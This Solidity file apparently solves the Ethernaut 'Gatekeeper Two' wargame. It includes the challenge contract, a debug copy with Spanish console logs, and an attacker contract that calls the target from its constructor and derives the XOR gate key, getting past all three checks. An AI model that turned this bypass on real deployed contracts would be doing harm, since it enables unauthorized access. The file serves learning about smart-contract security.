// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperTwoConsole {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "ERROR GATE 1");
    _;
  }

  modifier gateTwo() {
    uint x;
    address llamador;
    assembly { llamador := caller() }
    assembly { x := extcodesize(caller()) }
    console.log("VALOR DEL CALLER: %s", llamador); //Para saber quién es el caller.
    console.log("VALOR DE X: ", x); //
    require(x == 0, "ERROR GATE 2");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1, "ERROR GATE 3");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
//-----------------------------------------//

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateAttackerTwo {

    IGatekeeperTwo public challenge;

    constructor(address _gatekeeperone) public {
      uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0)-1);
      challenge = IGatekeeperTwo(_gatekeeperone);
      challenge.enter(bytes8(gateKey));
    }
}

//Al pie de la página 11 del yellow paper, podemos encontrar la información de la imagen Extcodesize.